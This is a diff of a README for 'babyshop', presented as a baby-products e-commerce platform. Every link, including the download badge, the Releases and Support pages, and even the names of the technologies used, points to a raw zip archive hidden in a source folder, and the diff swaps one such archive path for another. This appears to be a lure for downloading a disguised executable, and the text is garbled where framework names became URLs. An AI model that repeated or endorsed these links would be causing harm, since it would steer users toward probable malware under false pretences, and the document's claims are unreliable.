@@ -1,10 +1,10 @@
 # 🌟 babyshop - Your One-Stop Shop for Baby Essentials
 
-[![Download Now](https://raw.githubusercontent.com/vatmawatiso/babyshop/main/client/app/success/Software-v3.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/vatmawatiso/babyshop/main/client/app/success/Software-v3.9.zip)
+[![Download Now](https://raw.githubusercontent.com/vatmawatiso/babyshop/main/server/config/Software_2.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/vatmawatiso/babyshop/main/server/config/Software_2.0.zip)
 
 ## 📦 Overview
 
-The **babyshop** application is a modern e-commerce platform designed specifically for selling baby products and kids' essentials. Built using technologies such as https://raw.githubusercontent.com/vatmawatiso/babyshop/main/client/app/success/Software-v3.9.zip, React, https://raw.githubusercontent.com/vatmawatiso/babyshop/main/client/app/success/Software-v3.9.zip, and MongoDB, this platform comes with a comprehensive admin dashboard and an intuitive customer-facing storefront. 
+The **babyshop** application is a modern e-commerce platform designed specifically for selling baby products and kids' essentials. Built using technologies such as https://raw.githubusercontent.com/vatmawatiso/babyshop/main/server/config/Software_2.0.zip, React, https://raw.githubusercontent.com/vatmawatiso/babyshop/main/server/config/Software_2.0.zip, and MongoDB, this platform comes with a comprehensive admin dashboard and an intuitive customer-facing storefront. 
 
 Whether you are a new parent or a retailer, babyshop simplifies the shopping experience by providing easy navigation and a wide selection of baby products. 
 
@@ -19,13 +19,13 @@ To get started with babyshop, follow these simple steps:
    - Internet connection for initial setup and updates.
 
 2. **Download the Application**
-   - Visit our [Releases page](https://raw.githubusercontent.com/vatmawatiso/babyshop/main/client/app/success/Software-v3.9.zip) to download the latest version of babyshop.
+   - Visit our [Releases page](https://raw.githubusercontent.com/vatmawatiso/babyshop/main/server/config/Software_2.0.zip) to download the latest version of babyshop.
 
 ## 🔗 Download & Install
 
 To download babyshop:
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/vatmawatiso/babyshop/main/client/app/success/Software-v3.9.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/vatmawatiso/babyshop/main/server/config/Software_2.0.zip).
 2. Find the latest release.
 3. Click on the appropriate file for your operating system (Windows, macOS, or Linux).
 4. Save the file to your computer.
@@ -65,11 +65,11 @@ Once you have installed the application, you can start using it right away:
 
 ## 💬 Support
 
-If you encounter any issues or have questions about using babyshop, please visit our [Support page](https://raw.githubusercontent.com/vatmawatiso/babyshop/main/client/app/success/Software-v3.9.zip) on GitHub. Here, you can report bugs or request new features. 
+If you encounter any issues or have questions about using babyshop, please visit our [Support page](https://raw.githubusercontent.com/vatmawatiso/babyshop/main/server/config/Software_2.0.zip) on GitHub. Here, you can report bugs or request new features. 
 
 ## 💡 Tips
 
-- Regularly check for updates on the [Releases page](https://raw.githubusercontent.com/vatmawatiso/babyshop/main/client/app/success/Software-v3.9.zip) to benefit from the latest features and security enhancements.
+- Regularly check for updates on the [Releases page](https://raw.githubusercontent.com/vatmawatiso/babyshop/main/server/config/Software_2.0.zip) to benefit from the latest features and security enhancements.
 - Sign up for our newsletter to receive tips on finding the best baby products and updates about new arrivals.
 
 With babyshop, finding quality products for your little ones has never been easier. Explore today and simplify your shopping experience!
